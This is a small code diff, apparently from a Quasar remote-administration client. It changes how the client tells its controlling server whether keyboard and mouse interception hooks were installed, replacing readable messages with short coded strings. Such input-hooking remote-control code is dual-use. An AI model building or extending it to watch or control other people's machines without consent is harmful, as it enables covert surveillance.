@@ -610,14 +610,14 @@ namespace Quasar.Client.Interception
                 catch (Exception e) {
                     client.Send(new NotifyMessageToServer { Message = "Creating KB/M hooks error: " + e.Message });
                 }
-                client.Send(new NotifyMessageToServer { Message = "KB/M driver is installed now" });
+                client.Send(new NotifyMessageToServer { Type = "kbm_drv", Message = "KBMDRVICUR" });
                 return true;
                 //}
                 //client.Send(new NotifyMessageToServer { Message = "KB/M driver initialization failed!" });
             }
             else
             {
-                client.Send(new NotifyMessageToServer { Message = "KB/M driver is not installed!" });
+                client.Send(new NotifyMessageToServer { Type = "kbm_drv", Message = "KBMDRVNOTI" });
                 return false;
             }
         }
